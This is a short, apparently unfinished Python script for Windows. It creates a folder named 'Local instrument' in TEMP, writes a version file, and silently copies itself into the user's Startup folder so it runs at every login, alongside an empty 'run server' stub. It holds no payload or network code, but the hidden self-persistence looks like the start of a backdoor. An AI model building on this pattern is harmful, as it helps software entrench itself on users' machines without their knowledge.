from os import listdir, getcwd, getenv, mkdir, startfile

CURRENT_VERSION = '0.0.1v'
FILE_VERSION = 'version'

class Main:
    def __init__(self, testing=False):
        self.appdata = getenv('TEMP')
        self.folder_name = 'Local instrument'

        self.autorun_path = getenv('APPDATA') + fr'\Microsoft\Windows\Start Menu\Programs\Startup' + '\\'

        self.full_path = self.appdata + '\\' + self.folder_name + '\\'
        self.file_name = __file__.split('\\')[-1]

        self.testing = testing

        self._generate_folder()
        self._add_startapp()
        self._run_server()

    def _generate_folder(self):
        if not self.folder_name in listdir(self.appdata):
            mkdir(self.full_path)
            print(f'Create folder in {self.full_path}')
        
        self._create_version()

    def _create_version(self):
        # if not 'version' in listdir(self.full_path):
        with open(f'{self.full_path}\\{FILE_VERSION}', 'w') as file:
            file.write(CURRENT_VERSION)
            print('Create version file')

    def _add_startapp(self):
        if not 'Startup' in getcwd():
            with open(self.autorun_path + self.file_name, 'wb') as file1:
                with open(self.file_name, 'rb') as file2:
                    file1.write(file2.read())

            # startfile(self.autorun_path + self.file_name, cwd=self.autorun_path)
            # print(getcwd())
            # exit()

    def _run_server(self):
        pass
        # CREATE NEW FILE




if __name__ == '__main__':
    app = Main()
